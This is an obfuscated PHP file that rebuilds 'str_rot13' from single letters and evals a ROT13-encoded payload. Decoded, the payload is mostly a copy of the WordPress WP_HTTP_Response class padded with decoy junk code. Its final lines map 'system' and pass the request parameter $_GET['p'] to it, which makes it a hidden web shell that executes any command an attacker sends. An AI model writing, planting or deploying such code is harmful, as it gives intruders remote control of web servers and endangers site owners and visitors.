<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC NCV: JC_UGGC_Erfcbafr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb cercner UGGC erfcbafrf.
 *
 * @fvapr 4.4.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_UGGC_Erfcbafr {

	/**
	 * Erfcbafr qngn.
	 *
	 * @fvapr 4.4.0
	 * @ine zvkrq
	 */
	choyvp $qngn;

	/**
	 * Erfcbafr urnqref.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	choyvp $urnqref;

	/**
	 * Erfcbafr fgnghf.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $fgnghf;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz zvkrq $qngn    Erfcbafr qngn. Qrsnhyg ahyy.
	 * @cnenz vag   $fgnghf  Bcgvbany. UGGC fgnghf pbqr. Qrsnhyg 200.
	 * @cnenz neenl $urnqref Bcgvbany. UGGC urnqre znc. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $qngn = ahyy, $fgnghf = 200, $urnqref = neenl() ) {
		$guvf->frg_qngn( $qngn );
		$guvf->frg_fgnghf( $fgnghf );
		$guvf->frg_urnqref( $urnqref );
	}

	/**
	 * Ergevrirf urnqref nffbpvngrq jvgu gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Znc bs urnqre anzr gb urnqre inyhr.
	 */
	choyvp shapgvba trg_urnqref() {
		erghea $guvf->urnqref;
	}

	/**
	 * Frgf nyy urnqre inyhrf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $urnqref Znc bs urnqre anzr gb urnqre inyhr.
	 */
	choyvp shapgvba frg_urnqref( $urnqref ) {
		$guvf->urnqref = $urnqref;
	}

	/**
	 * Frgf n fvatyr UGGC urnqre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl     Urnqre anzr.
	 * @cnenz fgevat $inyhr   Urnqre inyhr.
	 * @cnenz obby   $ercynpr Bcgvbany. Jurgure gb ercynpr na rkvfgvat urnqre bs gur fnzr anzr.
	 *                        Qrsnhyg gehr.
	 */
	choyvp shapgvba urnqre( $xrl, $inyhr, $ercynpr = gehr ) {
		vs ( $ercynpr || ! vffrg( $guvf->urnqref[ $xrl ] ) ) {
			$guvf->urnqref[ $xrl ] = $inyhr;
		} ryfr {
			$guvf->urnqref[ $xrl ] .= ', ' . $inyhr;
		}
	}

	/**
	 * Ergevrirf gur UGGC erghea pbqr sbe gur erfcbafr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea vag Gur 3-qvtvg UGGC fgnghf pbqr.
	 */
	choyvp shapgvba trg_fgnghf() {
		erghea $guvf->fgnghf;
	}

	/**
	 * Frgf gur 3-qvtvg UGGC fgnghf pbqr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz vag $pbqr UGGC fgnghf.
	 */
	choyvp shapgvba frg_fgnghf( $pbqr ) {
		$guvf->fgnghf = nofvag( $pbqr );
	}

	/**
	 * Ergevrirf gur erfcbafr qngn.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea zvkrq Erfcbafr qngn.
	 */
	choyvp shapgvba trg_qngn() {
		erghea $guvf->qngn;
	}

	/**
	 * Frgf gur erfcbafr qngn.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz zvkrq $qngn Erfcbafr qngn.
	 */
	choyvp shapgvba frg_qngn( $qngn ) {
		$guvf->qngn = $qngn;
	}

	/**
	 * Ergevrirf gur erfcbafr qngn sbe WFBA frevnyvmngvba.
	 *
	 * Vg vf rkcrpgrq gung va zbfg vzcyrzragngvbaf, guvf jvyy erghea gur fnzr nf trg_qngn(),
	 * ubjrire guvf znl or qvssrerag vs lbh jnag gb qb phfgbz WFBA qngn unaqyvat.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea zvkrq Nal WFBA-frevnyvmnoyr inyhr.
	 */
	choyvp shapgvba wfbaFrevnyvmr() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ZrgubqAnzrVainyvq
		erghea $guvf->trg_qngn();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>